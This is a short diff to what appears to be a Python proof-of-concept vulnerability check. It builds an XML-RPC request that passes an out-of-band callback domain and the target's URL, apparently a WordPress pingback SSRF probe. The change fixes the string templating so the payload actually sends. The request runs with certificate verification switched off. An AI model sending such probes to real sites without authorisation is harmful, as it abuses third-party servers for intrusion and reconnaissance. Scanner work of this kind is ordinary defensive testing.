@@ -47,16 +47,16 @@ def poc(url):
   <params>
     <param>
       <value>
-        <string>http://oob_domain</string>
+        <string>http://{oob_domain}</string>
       </value>
     </param>
     <param>
       <value>
-        <string>{{BaseURL}}/?p=1</string>
+        <string>{BaseURL}/?p=1</string>
       </value>
     </param>
   </params>
-</methodCall>"""
+</methodCall>""".format(oob_domain=oob_domain, BaseURL=url)
         headers = {}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
